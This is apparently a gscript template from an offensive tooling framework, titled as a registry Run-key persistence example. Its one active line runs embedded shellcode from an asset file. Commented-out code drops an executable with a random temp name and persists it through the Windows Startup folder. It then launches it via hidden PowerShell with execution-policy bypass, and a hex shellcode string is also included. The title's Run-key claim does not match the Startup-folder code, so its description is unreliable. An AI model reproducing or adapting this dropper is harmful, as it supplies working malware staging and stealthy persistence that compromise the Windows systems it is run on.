// Example gscript template
// Title: CurrentVersion Run Persistence
// Author: ahhh
// Purpose: Drop a sample binary and persist it using a CurrentVersion\Run regkey
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1112

//priority:90
//timeout:150

//go_import:os as os
//go_import:github.com/gen0cide/gscript/x/windows as windows
//go_import:github.com/jax777/shellcode-launch/winshellcode
//import:morph.js
//import:sc.bin
function Deploy() {
  // shell = "\x50\x51\x52\x53\x56\x57\x55\x6A\x60\x5A\x68\x63\x61\x6C\x63\x54\x59\x48\x83\xEC\x28\x65\x48\x8B\x32\x48\x8B\x76\x18\x48\x8B\x76  \x10\x48\xAD\x48\x8B\x30\x48\x8B\x7E\x30\x03\x57\x3C\x8B\x5C\x17  \x28\x8B\x74\x1F\x20\x48\x01\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17  \x8D\x52\x02\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xEF\x8B\x74\x1F\x1C\x48\x01\xFE\x8B\x34\xAE\x48\x01\xF7\x99\xFF\xD7\x48\x83\xC4\x30\x5D\x5F\x5E\x5B\x5A\x59\x58\xC3";
  console.log("starting execution of Startup Persistence");
  // morph = GetAssetAsString("morph.js");
  // Prep the sample
  // var example = GetAssetAsBytes("main.exe");
  // var temppath = os.TempDir();
  // var naming = G.rand.GetAlphaString(5);
  // naming = naming.toLowerCase();
  // var fullpath = temppath+"\\"+naming+".exe";
  // var fullpath2 = temppath+"\\"+G.rand.GetAlphaString(5)+".txt";

  // Drop the sample
  // console.log("file name: "+ fullpath);
  // errors = G.file.WriteFileFromBytes(fullpath, example[0]);
  // errors2 = G.file.WriteFileFromString(fullpath2, eval(morph));
  // console.log("errors: "+errors2);

  // Persist the sample
  // var cmd = "powershell.exe -NoLogo -WindowStyle hidden -ep bypass " + fullpath;
  // var fn2 = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\start.exe";
  // G.file.WriteFileFromString(fn2, cmd);
  // G.file.WriteFileFromBytes(fn2,GetAssetAsBytes("main.exe"))
  // console.log("persisted the example binary using bat / powershell script in StartUp folder");
  // sc.Run(GetAssetAsBytes("loader.bin"));
  winshellcode.Run(GetAssetAsBytes("sc.bin"))
  // Execute the sample
  // var running = G.exec.ExecuteCommandAsync("powershell", ["-NoLogo", "-WindowStyle", "hidden", "-ep", "bypass", fn2]);
  // console.log("executed the example binary, errors: "+running[1]);

  // console.log("done, deployed binary with startup persistence");
  return true;
}
